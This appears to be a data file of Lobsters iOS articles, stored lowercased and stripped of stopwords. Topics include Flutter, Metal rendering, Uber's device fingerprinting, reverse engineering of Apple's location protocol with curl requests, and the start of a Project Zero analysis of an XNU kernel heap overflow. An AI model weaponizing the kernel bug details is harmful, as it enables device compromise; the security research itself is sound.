maintains gesture parity current trackpad mode io third remove expectation systemwide mousestyle pointer think laptopstyle trackpad would create think significant consideration precise pointing device would really useful io text entry expect come form mouse pointer thus think avoiding suggestion one altogether would lead le confusion proposed method pro user need functionality take long become aware user need may perceive halfbroken laptop trackpad present time coyle nicely summarizes common objection heard idea adding trackpad ipad keyboard adding mouse pointer io bad idea user see trackpad expect mouse cursor systemwide editing text maybe gut tell concern overblown even user expect mouse cursor first see trackpad adjust quickly realize wanted macbook using macbook definition anyone using ipad expecting act like mac think something happen move finger around trackpad even editing text tvos show something need mouse cursor moving around screen three objection coyle alternative solution first think would prove technical challenge create touchsensitive surface applequality latency responsiveness also double good surface typing existing smart keyboard rubbery several reason think rubbery used touchpad think gap key would result stuttery cursor movement second making twohanded operation clunky would twohanded people want move insertion point using right hand third making mode even easily toggleable mode feel like bad idea mode always bad ui design io software keyboard move cursor feature mode almost always better avoid modality discrete trackpad keyboard always keyboard trackpad always trackpad better keyboard usually keyboard sometimes trackpad say overthink put small trackpad keyboard moving insertion point around apple tvstyle navigation simple
280,Lobsters,ios,Apple iOS,The Unofficial WWDC app for macOS,https://wwdc.io,unofficial wwdc app macos,watch wwdc video year previous year live download chromecast pictureinpicture search filter new version favourite wwdc apple developer related project io app press,watch wwdc video year previous year watch session live download video later watch chromecast pictureinpicture mode search filter event track platform new version transcript provided apple universal link handoff share clip new community tab curated content cocoahub system requirement macos catalina later favourite wwdc apple developer related project apple official developer app io see schedule map video news excellent source article newsletter podcasts development apple platform collection wwdc scholarship winner io app also available searchable fulltext transcript wwdc session follow swift evolution proposal io device wwdc macos native app electron macos trademark apple inc registered u country app made affiliated endorsed apple press
281,Lobsters,ios,Apple iOS,Exploring Flutter for Cross-platform Mobile Development,https://sethlopez.me/article/exploring-flutter-for-cross-platform-mobile-development/,exploring flutter crossplatform mobile development,flutter easy setup installation instruction intellij idea dart dart rendering performance skia flux hot reload livereload getting started guide verdict send tweet,work weekly meeting mobile developer presentation given different developer week turn came around recently decided spend time researching flutter crossplatform framework google android developer always interested crossplatform framework potential benefit could provide often hear good thing coworkers others android development community explored flutter found framework surprisingly good albeit early development clear flutter tech preview phase hit alpha may day ago time writing important understand flutter still long way go way library general improvement framework said flutter alpha sure flutter developer want people try framework report bug come across suggestion easy setup setting development environment flutter incredibly straightforward installation instruction easy follow flutter cli includes doctor command check system flutter dependency tell exactly need install missing dependency intellij idea seems primary editor flutter apps flutter team maintains plugin experience flutter development intellij good plugin worked flawlessly providing autocompletion code formatting giving easy way run flutter apps io android emulator physical device dart actually using flutter take little detour learn dart programming language flutter apps written dart get aheadoftime aot compiled machine code meaning interpreter involved app run device initially really sure think dart language seems like combination java javascript ecmascript make sense google originally pushing web language would eventually support chrome dart lot feature would see well optional typing abstract class interface generic isolates similar green thread spending little bit time writing dart code found pretty easy language use expressive faster write understand java stay way rendering performance one interesting facet flutter use builtin ui widget either mobile platform instead flutter us graphic library called skia serf rendering engine draw flutter ui widget directly screen bypassing native ui rendering ui using special sauce layout painting compositing step flutter apps able achieve consistent frame per second found video pretty informative flutter able achieve performance goal video though flutter use native ui widget crossplatform framework widget android io could tell flutter google invention seemed material android widget io widget look like actively developing new cupertino widget tried couple flutter apps platform mostly great android found performance better apps built native android framework dropped frame anywhere sure see io biggest thing stuck scrolling quite feel right physic sure would require little tweaking flutter team two talk flutter google io day ago talk show easy make app platform video flutter everything widget composable way understand concept widget primarily couple thing create piece ui like screen button paragraph text wrap another widget modify look work applying style like color font etc creating padding margin layout defining input gesture recognition two main type widget statelesswidget statefulwidget statelesswidget sound state defines build method describes widget appears class redsquare extends statelesswidget final widget child redsquare key key thischild super key key override widget build buildcontext context return new container decoration new boxdecoration color new color shape boxshaperectangle child child statefulwidget hand keep track state separate class extends state class state class actually contains build method statefulwidget basically describing state appear class fizzbuzzscreen extends statefulwidget fizzbuzzscreen key key super key key override fizzbuzzscreenstate createstate new fizzbuzzscreenstate class fizzbuzzscreenstate extends state fizzbuzzscreen int counter void incrementcounter setstate counter string getfizzbuzz string fizzbuzz counter fizzbuzz fizz counter fizzbuzz buzz return fizzbuzzlength countertostring fizzbuzz override widget build buildcontext context return new scaffold body new center child new text counter getfizzbuzz floatingactionbutton new floatingactionbutton onpressed incrementcounter child new icon iconsadd example screen display text fizzbuzz counter using interpolated string call getfizzbuzz method determine text show floating action button fab call incrementcounter method pressed key getting widget screen case update user found incrementcounter method inside method call setstate defined state class pas anonymous function setstate mutate state needed within function setstate take care rebuilding widget display update user familiar concept flux might recognize somewhat similar oneway data flow ui reacts change state found refreshing flutter chose enforces sort pattern hot reload long build time something mobile developer experience daily basis one great thing flutter inclusion hot reload hot reload allows update source app fly without restart experience hot reload simple app screen incredibly fast time clicking hot reload button intellij seeing ui update emulator half second according flutter log eye experience similar get common tool frontend developer use called livereload even better hot reload clear state widget change piece ui use hot reload information widget previously still start home screen app every time update ui image getting started guide verdict surprised find solid framework flutter overall flutter look like promising crossplatform framework excited see go absolutely keeping future development framework might even start contributing library definitely encourage try flutter used flutter think send tweet
282,Lobsters,ios,Apple iOS,Engine Internals: Optimizing Our Renderer for Metal and iOS,https://medium.com/@heinapurola/engine-internals-optimizing-our-renderer-for-metal-and-ios-77aeff5faba,engine internals optimizing renderer metal io,engine internals optimizing renderer metal io presentation rendering architecture engine component system detailed blog post draw list thin wrapper rendering breakdown initialization shadow pas pbr lighting model tone mapping color correction srgb color space conversion debug ui cleanup tilebased deferred rendering metal imgtecblog metal metal render flow acquire command buffer acquire drawable create command encoder use command encoder end encoding draw call register callback commit command buffer metal applemetal tool process deterministic profiling metal system trace metal application shader compilation graphic driver activity vertex fragment display vsync scaler shader debugger frame capture metal tool tip big thing minimize pass singlepass pbr draw scene tone map zero zero one function constant maxvertexbonecountvalue triple buffering shaders registry usage reduce input data memory addressing device constant device signed constant c c texture sampling dynamic environment map reference summary,engine internals optimizing renderer metal iosthis year nordic game conference talk optimizing renderer tilebased deferred renderers metal io received really positive feedback talk decided write companion blog post topic find slide presentation presentation going start overview renderer architecture followed description tilebased deferred rendering well tool process utilize optimization finally go optimization tip trick employ rendererrendering architectureour renderer multilayered different layer exposing different optimization opportunitiesthe highest layer built top engine component system described detailed blog post written earlier layer describes concept model light camera crucial representing scenethe component first layer responsible creating draw command given next layer form draw list rendering scene orchestrated camera component defines three major draw list different type geometry opaque alpha tested alpha blended geometry rendered order reason describe detail discussing tilebased deferred renderingthe second layer renderer responsible translating draw call passed lowlevel call third final layer second layer ability perform optimization merging render passesthe final layer thin wrapper graphic api layer architectured around metal allowing u take advantage metal structural optimization higher level also map really well low level graphic apis vulkan breakdownour rendering performed roughly seven stepsinitialization performed start application loading worldshadow pas first pas performed frame pas render scene point view light create shadow map shadow mapping used higherend hardware lowerend device fall back using shadow blobsthe scene rendered floating point rgba texture using pbr lighting modeltone mapping color correction srgb color space conversion performed linear lighting previous stepdebug information rendered top lit postprocessed sceneui element rendered top final scene renderfinally perform cleanup game state change application existsafter employing optimization technique described later article able render scene two pass one pas lighting second one computing shadow mapstilebased deferred rendering metalios device based powervr chip perform rendering splitting screen tile limit amount memory required rendering full view rendering also performed draw command one go meaning graphic api need first compile whole frame sending gpu processingrendering start gpu vertex processing tiling process result called parameter buffer containing transformed geometry well information tile contain trianglesthe gpu split screen tile process one time load data parameter buffer needed rendering individual tile allows much smaller amount memory reside gpu chip itselfthe first thing rasterizer creating fragment polygon tile hidden surface removal done implicitly using earlyz pas might familiar working immediate mode renderers typical desktop gpu gpu shade fragment visible based ztest caveat perform opaque geometry mean really important render opaque geometry first followed alpha tested alpha blended geometry gpu stop early ztests moment encounter transparent triangle relying alpha testing discard shader modification depth value shaderthe new powervr chip optimized floating point math starting rogue series chip also separated floating point alus one reducing energy consumption providing even better throughput hardware also virtually free convert value imagination technology blog imgtecblog also really good post technology hoodnote apple actually announced ending partnership imagination technology develop gpu replace powervrmetalmetal graphic api quite lowlevel vulkan significantly lower opengl directx core idea behind metal use immutable state rendering move render state validation away frame rendering loading stagesmetal also provides direct visibility control rendering pipeline instance allows define content load tilelocal memory store back gpu finished passsince io metal also support memoryless render target ram backing surface exist tilelocal memory duration single pas benefit feature loadstore bandwidth used using surface depth texture good use case memoryless render target usually used texture future pass unless shadow map course one biggest benefit metal updating feature set io update also typically good adoption rate since io update tend become available older hardware well enables u use new metal optimization feature older generation hardware reduces amount special case needed developing renderermetal render flowthe process rendering single frame metal consists seven stepsacquire command buffer command queue command queue typically limited amount command buffer available reused operated single command buffer contains stream command gpu executeacquire drawable drawable defines final render target presented limited amount drawables available typically large bitmap size device screen create command encoder use encode draw command command buffer gpu execute single encoder defines single render pas rendering single set render targetsuse command encoder encode scene render command command bufferend encoding draw call note command yet sent gpu pointregister callback notified command command buffer executed gpucommit command buffer command finally sent gpu processingmore metalcheck applemetal indepth information metal use ittools processesoptimization work generally requires building tool process code order get information performance bottleneck platform sdks also typically provide tool collecting vital information target device going go system built engine well couple really helpful tool provided xcodedeterministic profilingespecially optimizing rendering code important advance small step limit amount moving part comparing often seemingly unconnected change lead astray analyzing resultswe built regression testing framework allows u script test play back deterministic manner test allow u compare result made modification codethe game code support framework allowing recording gameplay session played back gameplay fully deterministic long provide random number generator seed guaranteed get matching game state specific tick although minor fluctuation frame time still compare certain area profiler timeline see optimization endeavor successfulthe game code also support pause feature allowing u pause game capture frame analysis addition pause feature also option create fully static scene game agnostic viewer application feature us regression testing framework allows scripting creation model well effect freeze specific time static scene creation system allows u create specific frame continue rendering longer period time turn allows u use timeline tool smooth minor variation render time seemingly matching framesmetal system tracethe metal system trace allows u inspect individual frame scheduled gpu rendering work flow cpu final displayed surface gputhe tool split multiple track specifies certain type work top track called metal application show generation command buffer begin end cputhe track shader compilation show work related shader compilation work always pushed loading time track empty actually rendering gameplaythe graphic driver activity track display cpu work processing command buffer sending rendering operation gputhe vertex track display vertex transformation vertex shader execution tiling work block track typically much shorter matching fragment one depict work rasterization fragment shader execution render target readwritesthe display track indicates specific presented drawable displayed block fit individual line vsync track running fpsfinally would use feature like builtin srgb render target would see work scaler trackshader debugger frame captureone tool use frame capture tool allows u view individual draw call contributing finished frame well associated parameter loadstore bandwidth bound texture etcthe image display tree command buffer render command encoders individual metal call contributing frame captured see individual draw call opening render command encoder panel also display time take execute command encoder draw call question well general fps counter get overall view application performancethe frame capture tool also allows view shaders executed draw call shader panel display percentage time spent specific line allow expanding function call however limiting usability somewhatnote gpus generally support function unrolled worry potential performance hitone best feature frame capture shader debugger ability rebuild modified shader pressing button belowreload shaderspressing button also execute draw call frame show updated draw call timing allows make small modification shader immediately see effect sadly rebuilding proven somewhat unstable feature quite useful worksmore metal toolsto find optimization tool found xcode toolset check presentation held wwdc big thingsfinally let start talking tip trick optimizing metal tilebased renderers start big thing moving finer grained shader optimizationsminimize passesrender pass metal created individual render command encoders relatively high overhead associated related input data need copied ram tilelocal memory back pas finishedin case continuing render render target avoid creating new command encoders however need postprocessing previous pas thing get bit trickyi cover method utilize merge two pass first one render scene second one postprocessing itsinglepass pbrthe naive implementation hdr pbr involves first rendering scene intermediate floating point texture texture contain scene lighting hdrthe next step postprocessing pas perform tone mapping color correction finally convert color srgb color space outputmultipass pbrwhen using metal io use programmable blending merge draw scene tone map pass feature available new powervr gpus allows u readwrite framebuffer color value fragment shader metal happens passing structure fragment shader look something like process us two color texture bind floating point texture color zero output value target rendering scene postprocessing simply render fullscreen quad shader read color value color zero output processed pixel color color onethis approach allow u perform convolution intermediate texture however allows u touch color currently present pixel outputting tofunction constantsthe image already contained one use new feature metal called function constant constant given value request shader function metalfunction constant used like constant shader code allowing exclude code processing color rendering depth value shadow mapping code excluded way never get executed actually removed function returned allowing metal optimize codefor instance code using function constant called maxvertexbonecountvalue defined retrieve function metal set value instance limit execution loop iteration unrolledtriple bufferingrendering tilebased deferred renderer always happens one command buffer time mean gpu start processing render command receives full command buffer delaying processing way allows gpu perform automatic hidden surface removal described earlierthis method mean command buffer prepared unusable gpu processing command created command queue single command buffer code wait command buffer becomes available againfurthermore take time cpu know gpu finished vice versa io device based unified memory architecture mean cpu also take care access memory currently accessed gputriple buffer method remedy issue method based creating enough command buffer matching buffer perframe dynamic data cpu able provide gpu enough work starve furthermore cpu also optimally never wait free command buffertriple buffering flowthe image depicts process performing triple buffering always take time gpu start processing frame prepared cpu due communication latency quite often situation gpu also still using command buffer prepared first frame cpu already starting prepare third frameshadersnow covered big optimization tip trick let take moment enjoy small thing life optimizing shaders indepth discussion topic check presentation wwdc usagethe gpu shader core use register store intermediate value gpus different cpu use almost stack memory tend minuscule amount stack due large number thread need share itusing le register mean thread queued execution given time come fact thread waiting memory fetch instance need fit registry value registry file continue execution requested data arrivedregisters new powervr chip also wide course mean using math whenever possible halve registry usage shader leading significantly improved occupancy turn lead shorter wait time gpu pending texture fetch instancereduce input datanaturally important reduce amount data shader need access generally lower bandwidth requirement registry usagein case instance used matrix instead full one skinning actually three dot product metal packed matrix format could use compatible interface used opengl rendereri also recommend use compression whenever possible consider packing multiple texture individual channel single texture note however using srgb rgb component srgb encoded alpha component linearmemory addressingwhen writing shaders important pay attention address space two major address space device constantthe device address space used large amount data little reuse one good example data like vertex data always use data type range smaller equal signed integer modern powervr chip addressing instruction allow passing signed offset value need fit range else gpu manually compute addressthe constant address space used small amount data heavy reuse typically want define scenemodel constant using space constant space allows prefetching value constant registersgpus also attempt vectorize memory readsin code gpu read c using separate memory read following layout would allow read c single readtexture samplingthe shader compiler generally attempt schedule texture sampling operation happen early possible shader execution cross dynamic flow control however cross flow control based constant function constantsenvironment mapsfinally wanted share couple word environment mapping engine using cube map instead cylindrical environment map due superior sampling speedwe also use per channel rgba texture instead one save u bandwidth us le memory general fit hdr color value texture use custom compression schemeat preprocessing time first compute maximum rgb color component store rgb color divided maximum texture store maximum component divided alpha channel restore approximation original rgb value multiplying rgb color alpha time approach work well strong white light remove precision large variation channel however noticed significant degradation image quality kind environment map usingreferencessummaryin article covered presentation made nordic game conference optimizing renderer metal io first introduced reader tilebased deferred rendering use metal develop application platform moved describing high level architecture renderer finally explained tool process use optimizing rendering system well introduced important high low level optimization tip trick
283,Lobsters,ios,Apple iOS,Apple Launches App Development Curriculum for U.S. High School and College Students,https://www.macrumors.com/2017/05/24/apple-launches-swift-app-curriculum-students/,apple launch app development curriculum u high school college student,announced according one study advanced manufacturing fund,apple today announced new app development curriculum designed student want pursue career fastgrowing app economy curriculum come free download ibooks store called app development swift fullyear course aim teach student element app design using swift apple increasingly popular programming language apple said student undertake course learn code design fully functioning apps gaining critical job skill software development information technology process beginning fall six community college system serving nearly student across united state among first offer curriculum according apple participating college include alabama community college system columbus state community college harrisburg area community college houston community college mesa community college san mateo community college district seen firsthand impact coding individual u economy whole app economy software development among fastestgrowing job sector america thrilled providing educator student tool learn coding said tim cook apple ceo community college play critical role helping student achieve dream hope course open door people age background pursue love since launch swift consistently promoted apple ideal kid keen code gentle learning curve demonstrated swift playground app teach child use language new curriculum includes comprehensive student guide playground exercise mini project quiz well teacher guide grading rubric solution code keynote presentation swift become one soughtafter skill freelance developer experiencing percent yearonyear growth according one study earlier month apple announced creation billion advanced manufacturing fund focused creating job u throughout supply chain apple said new swift coding curriculum another example commitment economic development help create even career opportunity student across country
284,Lobsters,ios,Apple iOS,Resolving Massive View Controller with Coordinators & Model-View-ViewModel,http://anuragajwani.com/2017/05/resolving-massive-view-controller-with-coordinators-model-view-viewmodel/,resolving massive view controller coordinator modelviewviewmodel,,
285,Lobsters,ios,Apple iOS,Reverse Engineering Apple Location Services Protocol,https://appelsiini.net/2017/reverse-engineering-location-services/,reverse engineering apple location service protocol,reverse engineering apple location service protocol whereami little snitch charles location service request protocol buffer protomowersh guided location service response email protected email protected email protected email protected still result trilateration core location easier way thing additional reading application √† l analyse de donn√©es de g√©olocalisation envoy√©es par un smartphone vulnerability analysis countermeasure wifibased location service application gaussian process signal strengthbased location estimation reddit hacker news posted protocol buffer geolocation,reverse engineering apple location service protocol wed may update added new pdf link end header actually lengthprefix framed byte string working whereami got interested apple location service actually work know handled locationd since little snitch keep blocking usual way inspecting traffic proxychains work since macos something called system integrity protection sip alternative way setup charles mitm proxy io device looking traffic mostly device phoning home got needed location service request location service request request applicationxwwwformurlencode binary data post cllswloc host gslocapplecom contenttype applicationxwwwformurlencoded contentlength proxyconnection keepalive accept useragent acceptlanguage enus acceptencoding gzip deflate connection keepalive enus coma pplelocationd since data gzip header second guess protocol buffer rage cool guy using let try decode xxd r requesthex protoc decoderaw failed parse input work maybe something extra request logic say mac address part data let try decode blue part hex dump enus coma pplelocationd xxd r protoc decoderaw failed parse input nope top part look like header let try remove header instead enus coma pplelocationd xxd r protoc decoderaw failed parse input still go trial erroring decided brute force removing byte one one beginning see decodes bit polished version script binbash try decode hidden protocol buffer message binary size wc c size dd skip protoc decoderaw printf n read p removed byte continue yy n r printf nn reply yy exit fi fi done protomowersh protomowersh requestbin running first three match seemed like false positive output data garbled fourth one feel legit record record byte transferred sec bytessec removed byte continue yy seems like original idea quite close yellow part removed byte blue part successfully decoded protocol buffer message enus coma pplelocationd mean request message four different type data protocol buffer lingo data type called tag message four tag string contains mac address likely wifi router mac address embedded message contains value think struct object integer meaning unknown maybe age since router last seen signal noise ratio prove hypothesis let try make request different mac address used hex editor edit binary request file post request curl enus coma pplelocationd curl http gslocapplecomcllswloc include request post databinary bad request date sun may gmt cneonction close contenttype textplain xrid contentlength bad request go went wrong looking dump see message one byte longer must checksum somewhere one pretty obvious decimal original message byte long new message byte long would hex would also bet variable bit integer ie enus coma pplelocationd curl http gslocapplecomcllswloc include request post databinary ok xrid contenttype textplain contentlength success know format request header dissected furthrer originally though magical ascii control code however reader reddit guided correct direction seem lengthprefix framed byte string still think indicates start header though also look like header null terminated nul soh start header length length locale string byte locale enus length length identifier string byte identifier comapplelocationd length length version string byte version ie io version build nul nul end header nul soh start header nul nul end header sure last four byte mean maybe placeholder second header currently empty location service response response quite large email protected c bc ff ff ff ff bc ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff db de email protected ec ee email protected de c ec email protected cf de let try poor man brute forcing work decoded output approximately line long protomowersh responsebin c removed byte continue yy first one bit confusing ie maximum unsigned bit value probably mean mac address found idea think ie rest result clear mac address latitude pow longitude pow look like location accuracy probably wifi channel puzzled first get result occurred successful result first two mac address sent rest mac address close vicinity one submitted still result guess apple offloads trilateration calculation client instead expensive calculation everyone return bunch access point coordinate least three actually visible client core location use signal level distance three coordinate distance target location calculate target location reasonable accuracy access point location service returned requesting location changi information hundred access point around also reduces need contacting location service server long core location coordinate three visible access point calculate location accurately done even offline long wifi turned could write userland core location support programming language natively although easier way achieve thing interesting would write location service server help creative debugging location enabled apps additional reading application √† l analyse de donn√©es de g√©olocalisation envoy√©es par un smartphone fran√ßoisxavier aguessy c√¥me demoustier read french paper proto file example python code helped get started protocol seems changed since paper published though vulnerability analysis countermeasure wifibased location service application jun liang roy feng guang gong good reading general understand wifi based positioning work gaussian process signal strengthbased location estimation brian ferris dirk hahnel dieter fox understand half mathematics however paper give good insight problem indoor wifi positioning discussion reddit hacker news posted protocol buffer geolocation
286,Lobsters,ios,Apple iOS,Roughing It Dev Style: Coding Without a Computer,https://dev.to/chznbaum/roughing-it-dev-style-coding-without-a-computer,roughing dev style coding without computer,trial error codepen ide nt support mobile browser codeanywhere finally worked buffer editor feature digital ocean browser access local server binding get back coding productivity,terrible horrible good bad thing happened month surface pro exclusive personal work computer died even though found inexpensive replacement order could nt imagine coding week totally freaking unsatisfying day merely reading web development topic set work figuring could get real work done armed iphone trial error wanting hunt new solution unnecessary first turned tool used codepen codepen nt terrible pinch however layout onscreen keyboard really nt optimized coding phone making minor change took lot time easy end really buggy code ide problem already cluttered interface explicitly nt support mobile browser made clear multiple time making mobilefriendly developing native mobile app anywhere roadmap codeanywhere exploring issue saw mention alternative crossplatform cloud ide called codeanywhere however io app appeared updated since four unsuccessful attempt much create account login figured something better finally worked frustrating experience came across tool technique worked beyond expectation allowing code productively phone allow buffer editor hidden gem app store nt presence advertising word mouth even enough review warrant rating would easy underestimate buffer actually downloaded though clear buffer editor real powerful editor truly optimized mobile experience feature included extended keyboard make typing quick onehanded intentional welldesigned built terminal fullscreen editing necessity small screen syntax highlighting autocomplete language technology ability connect via ssh ftp sftp github dropbox icloud sending file email also included useful feature nt utilize vim support support bluetooth keyboard nt free usd price got well worth especially compared popular coda almost usd confined phone gave push needed start building website application directly vps solution like digital ocean rather starting solely local machine using virtual private server digital ocean call droplet allows setting development environment managing filesservers without needing local environment work since another computer cloud another benefit vps start project nt tied one local machine even nt checked version control yet digital ocean proven easy use inexpensive wealth documentation guide folk new running server accessing droplet remotely easy buffer editor simply involving adding new ssh connection filling relevant setting information droplet browser access local server binding wonderful problematic thing web development course primary thing need browser using vps develop access terminal console graphical user interface traditional web browser developing web app often need able start local server access localhost web browser since development server display app unfortunately localhost mean computer inaccessible outside vps hosting app file workaround involved learning server request starting server sends called bind request indicate ready receive request associated ip address local server typically bind ip address used loop back requesting computer computer request usually convenient developing clearly option need server bind request indicate publicly accessible ip address instead accessible browser outside computer ip address easily obtained digital ocean workaround involved adding binding flag like starting rail server rail bindingxxxxxxxx instead typing browser address bar view app would type publicly accessible ip address like long local server running binding flag app accessible remotely server ip address buffer editor especially convenient keeping server running back terminal open continue develop confusing first stop server lock unlock phone get back coding productivity utilize git like usual get work debug code wherever regardless wifiethernet availability fact day new computer arrived able make commits push github iphone day day coding traditional desktop laptop available since two hand faster one continue utilize tool work project ca nt bring laptop somewhere mobile internet access riding car actually thankful experience losing access computer forced find solution allows code virtually anywhere
287,Lobsters,ios,Apple iOS,Damage,http://mattgemmell.com/damage/,damage,,company done much damage perceived value software sustainability independent developer apple company done thing would apple successful one resolutely fault u consumer actively encouraged app store apple want developer target largest customer base get biggest potential income mean selling low price customer pay low price customer prefer low price teach customer average value low build universal app iphone ipad version package increase attractiveness convenience owning multiple io device earn buybutton store teach customer supporting multiple device something pay extra also include apple watch version within iphone app provide regular update cost much mechanism paid upgrade teach customer expect free upgrade life matter little paid software initially make exactly one sale app per person ever regardless number device often app updated since last used also teach customer entitled come back free app point future matter long ago paid ideally make exactly one sale app per family reinforces commodification software shared around sell store distribution mechanism product page design user flow cut provide marketing discovery kind beyond searchability small chance featured way majority customer probably idea price pay app almost higher amount developer receive tax ie apple take top consumerfocused reason lot point consumer focus reason almost case also deeply hostile sustainability small business software developer one measure value creative output another person willing pay low price actively court place le value work admonishment simple fact balance pricepoint sale figure achieve income far far people buy free trying sell inapp purchase sell instead number sale go much factor three increased price goal make money temporarily race bottom attendant risk environmentally corrosive effect probably best bet also need acknowledge marked work essentially worthless discarded quickly vocal supporter turn minute ask money remember extra level monument valley simply value enough even consider paying already taught work worth apple created huge market term potential customer absolutely done expense platforminvested developer community judging value income wise move justify basis choose ignore reality situation apple benevolent entity humancentric partner aesthetic ethos ever true mac app store different place course also nighabandoned apple chose make success would mechanism devaluation chase huge number tiny disposable purchase developer target mac last segment glassandaluminium cupertino hardware lineup still plausibly sustainable economics one course action pray apple remains disinterested
288,Lobsters,ios,Apple iOS,On Uber‚Äôs ‚ÄòIdentifying and Tagging‚Äô of iPhones,https://daringfireball.net/2017/04/uber_identifying_and_tagging_iphones,uber identifying tagging iphones,uber identifying tagging iphones mike isaac profile uber ceo travis kalanick new york time update first published time story use word tracking apple banned thirdparty apps accessing update update strafach examined build uber io app strafach confirms unrollme,uber identifying tagging iphones sunday april mike isaac profile uber ceo travis kalanick new york time contains accusation face sound outrageous month mr kalanick pulled fast one apple directing employee help camouflage ridehailing app apple engineer reason apple would find uber secretly identifying tagging iphones even app deleted device erased fraud detection maneuver violated apple privacy guideline apple deception mr kalanick arrived midafternoon meeting sporting favorite pair bright red sneaker hotpink sock mr cook prepared heard breaking rule mr cook said calm southern tone stop trickery mr cook demanded uber app would kicked apple app store mr kalanick moment fraught tension uber app yanked app store would lose access million iphone customer essentially destroying ridehailing company business mr kalanick acceded secretly identifying tagging iphones even app deleted device erased rather startling accusation sound like technically impossible also much unclear information uber able glean identified tagged iphones sort unique device identifier unfortunately time story short detail note time saying uber tracking phone lot people jumping conclusion uber somehow tracking location user even deleted uber app word track appears article context kalanick excelled running track playing football high school update explains lot regarding hubbub today story first published time story use word tracking subsequent revision changed word identifying tagging reading line possible gut say quite probable uber anything iphones app installed running end article idea fooling apple main distributor uber app began time uber dealing widespread account fraud place like china trickster bought stolen iphones erased memory resold uber driver would create dozen fake email address sign new uber rider account attached phone request ride phone would accept since uber handing incentive driver take ride driver could earn money way halt activity uber engineer assigned persistent identity iphones small piece code practice called fingerprinting uber could identify iphone prevent fooled even device erased content one problem fingerprinting iphones broke apple rule mr cook believed wiping iphone ensure trace owner identity remained device isaac reporting require code running iphone uber app installed launched speculating could something like uber app installed fingerprint device somehow report fingerprint home uber server tied user uber account iphones unique device identifier udid apple banned thirdparty apps accessing uber either found way access udids surreptitiously created way uniquely identifying device even wiped would good know exactly sake argument matter uber app deleted device andor device wiped point uber know fingerprint device use track device way care someone reinstalls uber app phone used book fraudulent ride uber app reinstalled iphone launch fingerprint check phone home uber know iphone seen fingerprint match violation apple privacy policy step uber app reinstalled think uber tracking phone way care time say whole project designed counter fraud china required uber app reinstalled stolen iphones repeating opening article isaac wrote apple would find uber secretly identifying tagging iphones even app deleted device erased fraud detection maneuver violated apple privacy guideline sound like uber identifying tagging whatever app deleted andor device wiped think might might actually mean merely identification persisted app deleted andor device wiped supposed technically possible io apis thing like udid even mac address stopped reporting unique identifier year ago abused privacy invasive ad tracker analytics package entitled shitbags like uber wrong apple right put end far le sensational prospect uber able identify tag iphone uber app deleted latter scenario seems technically possible thirdparty apps executing surreptitious code stuff uber sdk uber app left behind malware outside app sandbox think case think apple would hesitated remove uber app store infecting iphones hidden phonehome malware article raise question apis device info uber using identify iphones api loophole closed io learn exactly uber using identify device know technique longer work io user able feel confident delete app connection device developer app disconnected wipe device everything personally identifying removed exactly apple know uber action regard tim cook called kalanick meeting apple aware uber specifically keeping database unique iphone identifier prompted apple investigate uber regard uber suspect apple going investigate prompting geofence fingerprinting trigger cupertino theory uber app calling private apis used geofence avoid calling private apis app app store review assuming perhaps incorrectly app store reviewer work cupertino app store review identify apps call private apis update apple require uber disclose done condition remaining store iphone user uber installed know update strafach examined build uber io app found using private apis use iokit pull device serial number device registry might alone blatant violation app store policy strafach confirms technique uber using longer work io article also contains nonapplerelated tidbit uber devoted team socalled competitive intelligence purchasing data analytics service called slice intelligence using email digest service owns named unrollme slice collected customer emailed lyft receipt inboxes sold anonymized data uber uber used data proxy health lyft business lyft operates competitive intelligence team slice confirmed sell anonymized data meaning customer name attached based ride receipt uber lyft declined disclose buy information needle say super shitty expect uber slice ashamed unrollme service billed tool clean inbox identifying subscription email allowing unsubscribe bulk free sense pay money selling personal information company like uber supposedly information anonymized wiped iphones supposed anonymized uber found least one route around
289,Lobsters,ios,Apple iOS,Exception-oriented exploitation on iOS,https://googleprojectzero.blogspot.com/2017/04/exception-oriented-exploitation-on-ios.html,exceptionoriented exploitation io,,posted ian beer project zero post cover discovery exploitation heap buffer overflow machvoucherextractattrrecipetrap mach trap cover bug development exploitation technique involves repeatedly deliberately crashing build live kernel introspection feature using old kernel exploit trap alongside large number bsd syscalls like ioctl mmap execve xnu also small number extra syscalls supporting mach side kernel called mach trap mach trap syscall number start snippet syscallswc file trap table defined machtrap kernelrpcmachvmdeallocatetrap mungewll machtrap kerninvalid null machtrap kernelrpcmachvmprotecttrap mungewllww mach trap fastpaths kernel apis also exposed via standard mach mig kernel apis example machvmallocate also mig rpc called task port mach trap provide faster interface kernel function avoiding serialization deserialization overhead involved calling kernel mig apis without autogenerated code complex mach trap often lot manual argument parsing tricky get right io new entry appeared machtraps table machtrap machvoucherextractattrrecipetrap mungewwww mach trap entry code pack argument passed trap userspace structure struct machvoucherextractattrrecipeargs padarg machportnamet vouchername padarg machvoucherattrkeyt key padarg machvoucherattrrawrecipet recipe padarg useraddrt recipesize pointer structure passed trap implementation first argument worth noting point adding new syscall like mean called every sandboxed process system reach mandatory access control hook none sandbox provides protection let walk trap code kernreturnt machvoucherextractattrrecipetrap struct machvoucherextractattrrecipeargs args ipcvouchert voucher ivnull kernreturnt kr kernsuccess machmsgtypenumbert sz copyin args recipesize void sz sizeof sz return kernmemoryerror copyin similar semantics copyfromuser linux copy byte userspace pointer args recipesize sz variable kernel stack ensuring whole source range really userspace returning error code source range either completely mapped pointed kernel memory attacker control sz sz machvoucherattrmaxrawrecipearraysize return migarraytoolarge machmsgtypenumbert unsigned type sz le equal machvoucherattrmaxrawrecipearraysize continue voucher convertportnametovoucher args vouchername voucher ivnull return machsendinvaliddest convertportnametovoucher look args vouchername mach port name calling task mach port namespace check whether name ipcvoucher object returning reference voucher need provide valid voucher port vouchername continue past sz machvouchertrapstacklimit keep small recipe stack speed krecipe sz copyin args recipe void krecipe sz kr kernmemoryerror goto done kr machvoucherextractattrrecipe voucher args key machvoucherattrrawrecipet krecipe sz kr kernsuccess sz kr copyout krecipe void args recipe sz sz le machvouchertrapstacklimit allocates small variablelengtharray kernel stack copy sz byte userspace pointer args recipe vla code call target machvoucherextractattrrecipe method calling copyout take kernel userspace argument way round copyin copy result back userspace look okay let take look happens sz big let recipe kept stack speed else krecipe kalloc vmsizet sz krecipe kr kernresourceshortage goto done copyin args recipe void krecipe args recipesize kfree krecipe vmsizet sz kr kernmemoryerror goto done code continues let stop look really carefully snippet call kalloc make szbyte sized allocation kernel heap assigns address allocation krecipe call copyin copy args recipesize byte args recipe userspace pointer krecipe kernel heap buffer spot bug yet go back start code snippet read case bug completely wrong first glance actually look correct explain bug worth donning detective hat trying work happened cause code written 